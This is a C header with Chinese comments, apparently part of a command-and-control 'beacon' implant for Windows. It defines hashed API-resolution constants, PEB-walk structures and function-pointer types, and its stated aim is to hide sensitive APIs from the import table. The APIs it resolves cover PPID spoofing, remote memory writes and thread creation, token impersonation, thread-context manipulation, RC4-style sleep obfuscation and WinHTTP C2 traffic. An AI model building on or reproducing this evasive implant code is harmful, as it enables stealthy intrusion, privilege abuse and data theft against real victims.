#pragma once

/* 通过 PEB 遍历 + 基于哈希的导出表解析实现动态 API 解析。
 * 避免将敏感 API 放入导入表。 */

/* 确保已定义 _WIN32_WINNT 以包含 <winternl.h> 的完整内容。 */
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include "beacon_common.h"

/* ===== 未包含的 SDK 头文件类型定义 ===== */

/* NTSTATUS + UNICODE_STRING 来自 <winternl.h>。 */
#include <winternl.h>
#include <tlhelp32.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

/* CLIENT_ID - 某些 SDK 版本的 <winternl.h> 只定义 struct _CLIENT_ID，缺少 typedef。 */
#ifndef PCLIENT_ID
typedef struct _CLIENT_ID CLIENT_ID;
typedef struct _CLIENT_ID* PCLIENT_ID;
#endif

/* PROCESS_THREAD_ATTRIBUTE_LIST - 某些 SDK 版本的 <winnt.h> 未包含（PPID 欺骗用）。 */
#ifndef LPPROCESS_THREAD_ATTRIBUTE_LIST
typedef struct _PROCESS_THREAD_ATTRIBUTE_LIST {
    DWORD_PTR Reserved1;
    DWORD_PTR Reserved2[4];
} PROCESS_THREAD_ATTRIBUTE_LIST, *LPPROCESS_THREAD_ATTRIBUTE_LIST;
#endif

/* HCRYPTPROV - 来自 <wincrypt.h>，被 WIN32_LEAN_AND_MEAN 排除 */
typedef ULONG_PTR HCRYPTPROV;

/* BCrypt 不透明句柄 - 来自 <bcrypt.h>，不在 <windows.h> 中 */
typedef PVOID BCRYPT_ALG_HANDLE;
typedef PVOID BCRYPT_KEY_HANDLE;
typedef PVOID BCRYPT_HASH_HANDLE;
typedef PVOID BCRYPT_HANDLE;

typedef struct _MY_USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} MY_USTRING, *PMY_USTRING;

/* WinHTTP 类型 - 来自 <winhttp.h>，不在 <windows.h> 中 */
typedef PVOID HINTERNET;
typedef WORD INTERNET_PORT;
#define ICU_NO_ENCODE 0x20000000

typedef struct {
    DWORD   dwStructSize;
    LPWSTR  lpszScheme;
    DWORD   dwSchemeLength;
    INT     nScheme;
    LPWSTR  lpszHostName;
    DWORD   dwHostNameLength;
    INTERNET_PORT nPort;
    LPWSTR  lpszUrlPath;
    DWORD   dwUrlPathLength;
    LPWSTR  lpszExtraInfo;
    DWORD   dwExtraInfoLength;
} URL_COMPONENTS, *LPURL_COMPONENTS;

/* RTL_OSVERSIONINFOW - 用于 RtlGetVersion */
typedef struct _MY_RTL_OSVERSIONINFOW {
    ULONG dwOSVersionInfoSize;
    ULONG dwMajorVersion;
    ULONG dwMinorVersion;
    ULONG dwBuildNumber;
    ULONG dwPlatformId;
    WCHAR szCSDVersion[128];
} MY_RTL_OSVERSIONINFOW, *PMY_RTL_OSVERSIONINFOW;

/* ===== Seeded FNV-1a + rotate 哈希常量 ===== */

#define H_MOD_KERNEL32_DLL_HASH                     0x9B4BE45A
#define H_MOD_NTDLL_DLL_HASH                        0x8FD8A152
#define H_MOD_ADVAPI32_DLL_HASH                     0x001F4F2B
#define H_MOD_BCRYPT_DLL_HASH                       0x537A52FF
#define H_MOD_WINHTTP_DLL_HASH                      0x51514F50

/* kernel32.dll */
#define H_FUNC_CREATEFILEA_HASH                     0x3051FE73
#define H_FUNC_CREATEFILEW_HASH                     0x08A32E42
#define H_FUNC_READFILE_HASH                        0xB5A280F4
#define H_FUNC_WRITEFILE_HASH                       0xC5AB6D7F
#define H_FUNC_CLOSEHANDLE_HASH                     0xA4AF7FC0
#define H_FUNC_DUPLICATEHANDLE_HASH                 0x56ECA999
#define H_FUNC_GETFILESIZE_HASH                     0x46880ECE
#define H_FUNC_CREATEPROCESSW_HASH                  0x5610BEFF
#define H_FUNC_INITIALIZEPROCTHREADATTRIBUTELIST_HASH 0x78AB2243
#define H_FUNC_UPDATEPROCTHREADATTRIBUTE_HASH       0xCDE3176C
#define H_FUNC_DELETEPROCTHREADATTRIBUTELIST_HASH   0x4850CFE2
#define H_FUNC_OPENPROCESS_HASH                     0xCD6A51A8
#define H_FUNC_TERMINATEPROCESS_HASH                0x27B75FAE
#define H_FUNC_VIRTUALALLOC_HASH                    0x45B0A6F4
#define H_FUNC_VIRTUALFREE_HASH                     0xBAA68469
#define H_FUNC_CREATETHREAD_HASH                    0x40BDD6AE
#define H_FUNC_CREATETOOLHELP32SNAPSHOT_HASH        0xEFC2DE06
#define H_FUNC_PROCESS32FIRSTW_HASH                 0x877C7DE5
#define H_FUNC_PROCESS32NEXTW_HASH                  0x4E20E7F9
#define H_FUNC_GETMODULEFILENAMEW_HASH              0xBA1C1626
#define H_FUNC_QUERYFULLPROCESSIMAGENAMEW_HASH      0x4B6CF851
#define H_FUNC_ISWOW64PROCESS_HASH                  0xC1C9BF46
#define H_FUNC_GETNATIVESYSTEMINFO_HASH             0x12B46986
#define H_FUNC_MOVEFILEEXW_HASH                     0xA16D4B35
#define H_FUNC_COPYFILEW_HASH                       0x49B4CCEA
#define H_FUNC_DELETEFILEW_HASH                     0xDED19BA7
#define H_FUNC_CREATEDIRECTORYW_HASH                0xC5359D0F
#define H_FUNC_REMOVEDIRECTORYW_HASH                0x550ED573
#define H_FUNC_FINDFIRSTFILEW_HASH                  0xA5FB4BB5
#define H_FUNC_FINDNEXTFILEW_HASH                   0x2DAB5429
#define H_FUNC_FINDCLOSE_HASH                       0x4AA46213
#define H_FUNC_GETFILEATTRIBUTESW_HASH              0x0190E75C
#define H_FUNC_SETFILEATTRIBUTESW_HASH              0xE93337C5
#define H_FUNC_GETFILETIME_HASH                     0x0841F756
#define H_FUNC_SETFILETIME_HASH                     0x3343190A
#define H_FUNC_GETCURRENTDIRECTORYW_HASH            0x454519A9
#define H_FUNC_SETCURRENTDIRECTORYW_HASH            0xD6AD9A52
#define H_FUNC_PROCESSIDTOSESSIONID_HASH            0x3BD1164C
#define H_FUNC_GETTIMEZONEINFORMATION_HASH          0x330915EE
#define H_FUNC_FILETIMETOLOCALFILETIME_HASH         0xD2923030
#define H_FUNC_FILETIMETOSYSTEMTIME_HASH            0x3F692352
#define H_FUNC_SYSTEMTIMETOFILETIME_HASH            0x773AFF22
#define H_FUNC_LOCALFILETIMETOFILETIME_HASH         0x6EACBAEA
#define H_FUNC_GETCOMPUTERNAMEW_HASH                0x1A32A1CF
#define H_FUNC_GETUSERNAMEW_HASH                    0xF11E49F7
#define H_FUNC_GETSYSTEMINFO_HASH                   0x426ABB1B
#define H_FUNC_SETHANDLEINFORMATION_HASH            0x39040223
#define H_FUNC_CREATEPIPE_HASH                      0xCF8CAEDC
#define H_FUNC_GETSTDHANDLE_HASH                    0x2C73A4E6
#define H_FUNC_WAITFORSINGLEOBJECT_HASH             0x3A3B335B
#define H_FUNC_WAITFORMULTIPLEOBJECTS_HASH          0xD135C53D
#define H_FUNC_GETEXITCODEPROCESS_HASH              0x6568A1BB
#define H_FUNC_FLUSHFILEBUFFERS_HASH                0x7CB9E5DD
#define H_FUNC_SETENDOFFILE_HASH                    0x6887114C
#define H_FUNC_SETFILEPOINTEREX_HASH                0x2E0C4A79
#define H_FUNC_GETFILESIZEEX_HASH                   0xA0CF5BA3
#define H_FUNC_HEAPALLOC_HASH                       0xE4B0075D
#define H_FUNC_HEAPFREE_HASH                        0x0136DE48
#define H_FUNC_HEAPREALLOC_HASH                     0x54DF4B77
#define H_FUNC_GETPROCESSHEAP_HASH                  0xF94F660E
#define H_FUNC_GETCURRENTPROCESS_HASH               0xB1AA6E97
#define H_FUNC_GETCURRENTPROCESSID_HASH             0xD69262DD
#define H_FUNC_GETCURRENTTHREAD_HASH                0x4A3EF26C
#define H_FUNC_GETCURRENTTHREADID_HASH              0xB0E7F923
#define H_FUNC_SLEEP_HASH                           0xDF993C6D
#define H_FUNC_GETTICKCOUNT64_HASH                  0x58CC9B4C
#define H_FUNC_GETSYSTEMTIMEASFILETIME_HASH         0xF248F787
#define H_FUNC_OUTPUTDEBUGSTRINGA_HASH              0xB26D9EBF
#define H_FUNC_GETLASTERROR_HASH                    0x34255573
#define H_FUNC_SETLASTERROR_HASH                    0xD0D34182
#define H_FUNC_MULTIBYTETOWIDECHAR_HASH             0x601E2E49
#define H_FUNC_WIDECHARTOMULTIBYTE_HASH             0x2F901D81
#define H_FUNC_GETACP_HASH                          0x4A3CE31A
#define H_FUNC_GETOEMCP_HASH                        0xFAF7ABF6
#define H_FUNC_GETCONSOLECP_HASH                    0x6497A214
#define H_FUNC_GETCOMMANDLINEW_HASH                 0xAAF67EFF
#define H_FUNC_LOADLIBRARYW_HASH                    0x7D9B468D
#define H_FUNC_LOADLIBRARYA_HASH                    0xB40AB67A
#define H_FUNC_GETPROCADDRESS_HASH                  0xEBF0E4E4
#define H_FUNC_FREELIBRARY_HASH                     0xD56603F9
#define H_FUNC_GETMODULEHANDLEW_HASH                0x2C7A03A8
#define H_FUNC_GETMODULEHANDLEA_HASH                0x40B1B383
#define H_FUNC_VIRTUALPROTECT_HASH                  0xBDFFF23D
#define H_FUNC_CREATEEVENTW_HASH                    0xBFA5C699
#define H_FUNC_SETEVENT_HASH                        0x7969910F
#define H_FUNC_CREATETIMERQUEUE_HASH                0x53ADA31E
#define H_FUNC_CREATETIMERQUEUETIMER_HASH           0x3821392B
#define H_FUNC_DELETETIMERQUEUEEX_HASH              0x5108A518

/* ntdll.dll */
#define H_FUNC_RTLGETVERSION_HASH                   0x2D7AC9A7
#define H_FUNC_NTQUERYINFORMATIONPROCESS_HASH       0xD444BDF8
#define H_FUNC_NTQUERYSYSTEMINFORMATION_HASH        0xB5059BBD
#define H_FUNC_RTLINITUNICODESTRING_HASH            0xB6360C7E
#define H_FUNC_NTCLOSE_HASH                         0x031A39ED
#define H_FUNC_LDRLOADDLL_HASH                      0x357BD8E0
#define H_FUNC_NTRESUMETHREAD_HASH                  0x10239C78
#define H_FUNC_NTCREATETHREADEX_HASH                0xDF3ADD82
#define H_FUNC_RTLEXITUSERTHREAD_HASH               0x1DC86012
#define H_FUNC_NTGETCONTEXTTHREAD_HASH              0x30E39898
#define H_FUNC_NTSETCONTEXTTHREAD_HASH              0xAA434025
#define H_FUNC_NTWAITFORSINGLEOBJECT_HASH           0x1439991F
#define H_FUNC_NTTERMINATETHREAD_HASH               0x7D1F2E63
#define H_FUNC_NTPROTECTVIRTUALMEMORY_HASH          0xD9C8AD7B
#define H_FUNC_NTALLOCATEVIRTUALMEMORY_HASH         0xF762436F
#define H_FUNC_NTOPENPROCESS_HASH                   0x8CA67E76
#define H_FUNC_NTWRITEVIRTUALMEMORY_HASH            0xB02C7066
#define H_FUNC_LDRGETPROCEDUREADDRESS_HASH          0xD5CD8CC5
#define H_FUNC_RTLADDVECTOREDEXCEPTIONHANDLER_HASH  0xDB92E241
#define H_FUNC_RTLREMOVEVECTOREDEXCEPTIONHANDLER_HASH 0xA89A9B66
#define H_FUNC_TPRELEASECLEANUPGROUPMEMBERS_HASH    0xED51C59E
#define H_FUNC_RTLCAPTURECONTEXT_HASH               0x56DC8D2C
#define H_FUNC_NTCONTINUE_HASH                      0xAC582D67
#define H_FUNC_RTLCREATETIMERQUEUE_HASH             0xD55D5CED
#define H_FUNC_RTLCREATETIMER_HASH                  0x4A1BF819
#define H_FUNC_RTLDELETETIMERQUEUE_HASH             0xF4191C3C
#define H_FUNC_RTLREGISTERWAIT_HASH                 0x00AE0697
#define H_FUNC_RTLDEREGISTERWAIT_HASH               0x668D82D7

/* advapi32.dll */
#define H_FUNC_OPENPROCESSTOKEN_HASH                0x144D789C
#define H_FUNC_GETTOKENINFORMATION_HASH             0x1019A05A
#define H_FUNC_DUPLICATETOKENEX_HASH                0xCE479F07
#define H_FUNC_IMPERSONATELOGGEDONUSER_HASH         0x9F585979
#define H_FUNC_REVERTTOSELF_HASH                    0xDFFA1D5A
#define H_FUNC_LOOKUPACCOUNTSIDW_HASH               0x47FE217A
#define H_FUNC_REGOPENKEYEXW_HASH                   0x6725E8A9
#define H_FUNC_REGQUERYVALUEEXW_HASH                0x395A15E3
#define H_FUNC_REGCLOSEKEY_HASH                     0x9CE59D41
#define H_FUNC_CRYPTACQUIRECONTEXTW_HASH            0xE6763483
#define H_FUNC_CRYPTRELEASECONTEXT_HASH             0xF166D25F
#define H_FUNC_CRYPTGENRANDOM_HASH                  0x1E189EA1
#define H_FUNC_SYSTEMFUNCTION032_HASH               0xA69D4EC7

/* bcrypt.dll */
#define H_FUNC_BCRYPTOPENALGORITHMPROVIDER_HASH     0x0D98DD70
#define H_FUNC_BCRYPTCLOSEALGORITHMPROVIDER_HASH    0xF6F82CB0
#define H_FUNC_BCRYPTGETPROPERTY_HASH               0x6FA1BFDF
#define H_FUNC_BCRYPTSETPROPERTY_HASH               0x237187D6
#define H_FUNC_BCRYPTGENERATESYMMETRICKEY_HASH      0xC06F3A57
#define H_FUNC_BCRYPTDESTROYKEY_HASH                0xB8DD434A
#define H_FUNC_BCRYPTENCRYPT_HASH                   0xC265CB1D
#define H_FUNC_BCRYPTDECRYPT_HASH                   0x84B85B36
#define H_FUNC_BCRYPTIMPORTKEY_HASH                 0x48A1B270
#define H_FUNC_BCRYPTCREATEHASH_HASH                0xC766A4A1
#define H_FUNC_BCRYPTHASHDATA_HASH                  0xD986E56C
#define H_FUNC_BCRYPTFINISHHASH_HASH                0xEE095D7D
#define H_FUNC_BCRYPTDESTROYHASH_HASH               0x4B2DD89F
#define H_FUNC_BCRYPTGENRANDOM_HASH                 0x1259C633

/* winhttp.dll */
#define H_FUNC_WINHTTPOPEN_HASH                     0xF59F9A6D
#define H_FUNC_WINHTTPCONNECT_HASH                  0x41890373
#define H_FUNC_WINHTTPOPENREQUEST_HASH              0xC71EEB2C
#define H_FUNC_WINHTTPSENDREQUEST_HASH              0xE61BBA67
#define H_FUNC_WINHTTPRECEIVERESPONSE_HASH          0xF89A0C65
#define H_FUNC_WINHTTPQUERYDATAAVAILABLE_HASH       0x83E3B524
#define H_FUNC_WINHTTPREADDATA_HASH                 0x7EB06511
#define H_FUNC_WINHTTPCLOSEHANDLE_HASH              0xE38D7A42
#define H_FUNC_WINHTTPSETOPTION_HASH                0x5724C52D
#define H_FUNC_WINHTTPCRACKURL_HASH                 0x41F0FC71
#define H_FUNC_WINHTTPQUERYHEADERS_HASH             0xBAC34DF7

/* ===== 用于 PEB 遍历的自定义 LDR_DATA_TABLE_ENTRY ===== */

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

/* ===== BOF 加载器需要的 NT 类型定义 ===== */
/* OBJECT_ATTRIBUTES 和 InitializeObjectAttributes 已在 <winternl.h> 中定义 */

typedef struct _PS_ATTRIBUTE {
    ULONG_PTR Attribute;
    SIZE_T Size;
    union {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef _Function_class_(USER_THREAD_START_ROUTINE) NTSTATUS(NTAPI *USER_THREAD_START_ROUTINE)(PVOID);
typedef USER_THREAD_START_ROUTINE PUSER_THREAD_START_ROUTINE;

/* ===== 函数指针类型定义 ===== */

/* kernel32 */
typedef HANDLE(WINAPI *fnCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef HANDLE(WINAPI *fnCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI *fnReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI *fnWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI *fnCloseHandle)(HANDLE);
typedef BOOL(WINAPI *fnDuplicateHandle)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
typedef DWORD(WINAPI *fnGetFileSize)(HANDLE, LPDWORD);
typedef BOOL(WINAPI *fnCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI *fnInitializeProcThreadAttributeList)(LPPROCESS_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL(WINAPI *fnUpdateProcThreadAttribute)(LPPROCESS_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef VOID(WINAPI *fnDeleteProcThreadAttributeList)(LPPROCESS_THREAD_ATTRIBUTE_LIST);
typedef HANDLE(WINAPI *fnOpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL(WINAPI *fnTerminateProcess)(HANDLE, UINT);
typedef LPVOID(WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI *fnVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef BOOL(WINAPI *fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI *fnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE(WINAPI *fnCreateEventW)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
typedef BOOL(WINAPI *fnSetEvent)(HANDLE);
typedef HANDLE(WINAPI *fnCreateTimerQueue)(VOID);
typedef BOOL(WINAPI *fnCreateTimerQueueTimer)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
typedef BOOL(WINAPI *fnDeleteTimerQueueEx)(HANDLE, HANDLE);
typedef HANDLE(WINAPI *fnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI *fnProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL(WINAPI *fnProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
typedef DWORD(WINAPI *fnGetModuleFileNameW)(HMODULE, LPWSTR, DWORD);
typedef BOOL(WINAPI *fnQueryFullProcessImageNameW)(HANDLE, DWORD, LPWSTR, PDWORD);
typedef BOOL(WINAPI *fnIsWow64Process)(HANDLE, PBOOL);
typedef VOID(WINAPI *fnGetNativeSystemInfo)(LPSYSTEM_INFO);
typedef BOOL(WINAPI *fnMoveFileExW)(LPCWSTR, LPCWSTR, DWORD);
typedef BOOL(WINAPI *fnCopyFileW)(LPCWSTR, LPCWSTR, BOOL);
typedef BOOL(WINAPI *fnDeleteFileW)(LPCWSTR);
typedef BOOL(WINAPI *fnCreateDirectoryW)(LPCWSTR, LPSECURITY_ATTRIBUTES);
typedef BOOL(WINAPI *fnRemoveDirectoryW)(LPCWSTR);
typedef HANDLE(WINAPI *fnFindFirstFileW)(LPCWSTR, LPWIN32_FIND_DATAW);
typedef BOOL(WINAPI *fnFindNextFileW)(HANDLE, LPWIN32_FIND_DATAW);
typedef BOOL(WINAPI *fnFindClose)(HANDLE);
typedef DWORD(WINAPI *fnGetFileAttributesW)(LPCWSTR);
typedef BOOL(WINAPI *fnSetFileAttributesW)(LPCWSTR, DWORD);
typedef BOOL(WINAPI *fnGetFileTime)(HANDLE, LPFILETIME, LPFILETIME, LPFILETIME);
typedef BOOL(WINAPI *fnSetFileTime)(HANDLE, const FILETIME*, const FILETIME*, const FILETIME*);
typedef DWORD(WINAPI *fnGetCurrentDirectoryW)(DWORD, LPWSTR);
typedef BOOL(WINAPI *fnSetCurrentDirectoryW)(LPCWSTR);
typedef BOOL(WINAPI *fnProcessIdToSessionId)(DWORD, DWORD*);
typedef DWORD(WINAPI *fnGetTimeZoneInformation)(LPTIME_ZONE_INFORMATION);
typedef BOOL(WINAPI *fnFileTimeToLocalFileTime)(const FILETIME*, LPFILETIME);
typedef BOOL(WINAPI *fnFileTimeToSystemTime)(const FILETIME*, LPSYSTEMTIME);
typedef BOOL(WINAPI *fnSystemTimeToFileTime)(const SYSTEMTIME*, LPFILETIME);
typedef BOOL(WINAPI *fnLocalFileTimeToFileTime)(const FILETIME*, LPFILETIME);
typedef BOOL(WINAPI *fnGetComputerNameW)(LPWSTR, LPDWORD);
typedef BOOL(WINAPI *fnGetUserNameW)(LPWSTR, LPDWORD);
typedef VOID(WINAPI *fnGetSystemInfo)(LPSYSTEM_INFO);
typedef BOOL(WINAPI *fnSetHandleInformation)(HANDLE, DWORD, DWORD);
typedef BOOL(WINAPI *fnCreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef HANDLE(WINAPI *fnGetStdHandle)(DWORD);
typedef DWORD(WINAPI *fnWaitForSingleObject)(HANDLE, DWORD);
typedef DWORD(WINAPI *fnWaitForMultipleObjects)(DWORD, const HANDLE*, BOOL, DWORD);
typedef BOOL(WINAPI *fnGetExitCodeProcess)(HANDLE, LPDWORD);
typedef BOOL(WINAPI *fnFlushFileBuffers)(HANDLE);
typedef BOOL(WINAPI *fnSetEndOfFile)(HANDLE);
typedef BOOL(WINAPI *fnSetFilePointerEx)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD);
typedef BOOL(WINAPI *fnGetFileSizeEx)(HANDLE, PLARGE_INTEGER);
typedef LPVOID(WINAPI *fnHeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef BOOL(WINAPI *fnHeapFree)(HANDLE, DWORD, LPVOID);
typedef LPVOID(WINAPI *fnHeapReAlloc)(HANDLE, DWORD, LPVOID, SIZE_T);
typedef HANDLE(WINAPI *fnGetProcessHeap)(VOID);
typedef HANDLE(WINAPI *fnGetCurrentProcess)(VOID);
typedef DWORD(WINAPI *fnGetCurrentProcessId)(VOID);
typedef HANDLE(WINAPI *fnGetCurrentThread)(VOID);
typedef DWORD(WINAPI *fnGetCurrentThreadId)(VOID);
typedef VOID(WINAPI *fnSleep)(DWORD);
typedef ULONGLONG(WINAPI *fnGetTickCount64)(VOID);
typedef VOID(WINAPI *fnGetSystemTimeAsFileTime)(LPFILETIME);
typedef VOID(WINAPI *fnOutputDebugStringA)(LPCSTR);
typedef DWORD(WINAPI *fnGetLastError)(VOID);
typedef VOID(WINAPI *fnSetLastError)(DWORD);
typedef INT(WINAPI *fnMultiByteToWideChar)(UINT, DWORD, LPCSTR, INT, LPWSTR, INT);
typedef INT(WINAPI *fnWideCharToMultiByte)(UINT, DWORD, LPCWSTR, INT, LPSTR, INT, LPCSTR, LPBOOL);
typedef UINT(WINAPI *fnGetACP)(VOID);
typedef UINT(WINAPI *fnGetOEMCP)(VOID);
typedef UINT(WINAPI *fnGetConsoleCP)(VOID);
typedef LPWSTR(WINAPI *fnGetCommandLineW)(VOID);
typedef HMODULE(WINAPI *fnLoadLibraryW)(LPCWSTR);
typedef HMODULE(WINAPI *fnLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI *fnGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL(WINAPI *fnFreeLibrary)(HMODULE);
typedef HMODULE(WINAPI *fnGetModuleHandleW)(LPCWSTR);
typedef HMODULE(WINAPI *fnGetModuleHandleA)(LPCSTR);

/* ntdll */
typedef NTSTATUS(NTAPI *fnRtlGetVersion)(PMY_RTL_OSVERSIONINFOW);
typedef NTSTATUS(NTAPI *fnNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI *fnNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef VOID(NTAPI *fnRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS(NTAPI *fnNtClose)(HANDLE);
typedef NTSTATUS(NTAPI *fnLdrLoadDll)(PWCHAR, PULONG, PUNICODE_STRING, PHANDLE);
typedef NTSTATUS(NTAPI *fnNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI *fnNtGetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS(NTAPI *fnNtSetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS(NTAPI *fnNtResumeThread)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI *fnNtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI *fnNtTerminateThread)(HANDLE, NTSTATUS);
typedef NTSTATUS(NTAPI *fnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI *fnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI *fnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI *fnNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef NTSTATUS(NTAPI *fnLdrGetProcedureAddress)(PVOID, PCANSI_STRING, ULONG, PVOID*);
typedef VOID(NTAPI *fnRtlExitUserThread)(NTSTATUS);
typedef PVOID(NTAPI *fnRtlAddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);
typedef ULONG(NTAPI *fnRtlRemoveVectoredExceptionHandler)(PVOID);
typedef VOID(NTAPI *fnRtlCaptureContext)(PCONTEXT);
typedef NTSTATUS(NTAPI *fnNtContinue)(PCONTEXT, BOOLEAN);
typedef NTSTATUS(NTAPI *fnRtlCreateTimerQueue)(PHANDLE);
typedef NTSTATUS(NTAPI *fnRtlCreateTimer)(HANDLE, PHANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
typedef NTSTATUS(NTAPI *fnRtlDeleteTimerQueue)(HANDLE);
typedef NTSTATUS(NTAPI *fnRtlRegisterWait)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, ULONG, ULONG);
typedef NTSTATUS(NTAPI *fnRtlDeregisterWait)(HANDLE);

/* advapi32 */
typedef BOOL(WINAPI *fnOpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL(WINAPI *fnGetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
typedef BOOL(WINAPI *fnDuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
typedef BOOL(WINAPI *fnImpersonateLoggedOnUser)(HANDLE);
typedef BOOL(WINAPI *fnRevertToSelf)(VOID);
typedef BOOL(WINAPI *fnLookupAccountSidW)(LPCWSTR, PSID, LPWSTR, PDWORD, LPWSTR, PDWORD, PSID_NAME_USE);
typedef LSTATUS(WINAPI *fnRegOpenKeyExW)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
typedef LSTATUS(WINAPI *fnRegQueryValueExW)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LSTATUS(WINAPI *fnRegCloseKey)(HKEY);
typedef BOOL(WINAPI *fnCryptAcquireContextW)(HCRYPTPROV*, LPCWSTR, LPCWSTR, DWORD, DWORD);
typedef BOOL(WINAPI *fnCryptReleaseContext)(HCRYPTPROV, DWORD);
typedef BOOL(WINAPI *fnCryptGenRandom)(HCRYPTPROV, DWORD, BYTE*);
typedef NTSTATUS(WINAPI *fnSystemFunction032)(PMY_USTRING, PMY_USTRING);

/* bcrypt */
typedef NTSTATUS(WINAPI *fnBCryptOpenAlgorithmProvider)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS(WINAPI *fnBCryptCloseAlgorithmProvider)(BCRYPT_ALG_HANDLE, ULONG);
typedef NTSTATUS(WINAPI *fnBCryptGetProperty)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS(WINAPI *fnBCryptSetProperty)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI *fnBCryptGenerateSymmetricKey)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI *fnBCryptDestroyKey)(BCRYPT_KEY_HANDLE);
typedef NTSTATUS(WINAPI *fnBCryptEncrypt)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS(WINAPI *fnBCryptDecrypt)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS(WINAPI *fnBCryptImportKey)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE, LPCWSTR, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
